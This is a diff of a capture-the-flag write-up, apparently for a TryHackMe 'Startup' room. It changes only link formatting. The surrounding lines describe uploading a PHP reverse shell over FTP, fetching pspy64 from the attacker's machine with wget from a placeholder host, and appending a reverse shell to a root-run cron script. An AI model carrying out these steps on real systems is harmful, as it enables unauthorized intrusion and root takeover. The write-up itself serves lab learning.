@@ -46,7 +46,7 @@ We have found `files` directory. Let's visit it.
 
 ![files](/assets/images/thm/startup/files.png)
 
-These are the files from FTP which we had visited. Let's try to upload reverse shell script. I'm going to use this one `https://github.com/pentestmonkey/php-reverse-shell` Don't forget to change the IP address with your attacking machine IP and desired port.
+These are the files from FTP which we had visited. Let's try to upload reverse shell script. I'm going to use this one <https://github.com/pentestmonkey/php-reverse-shell> Don't forget to change the IP address with your attacking machine IP and desired port.
 
 Go again to the FTP server and navigate to `ftp` folder. From there you can execute the following command `put <FILE_NAME>` to upload your reverse shell script.
 
@@ -146,7 +146,7 @@ wget http://<YOUR_IP>:8000/pspy64
 
 As we thought planner.sh is run by cronjob as root 
 
-So, we are the owner of print.sh. We can add some additional script in it. Here you can find some reverse shell cheat sheet `https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet` 
+So, we are the owner of print.sh. We can add some additional script in it. Here you can find some reverse shell cheat sheet <https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet> 
 
 Change the script with your IP address
 
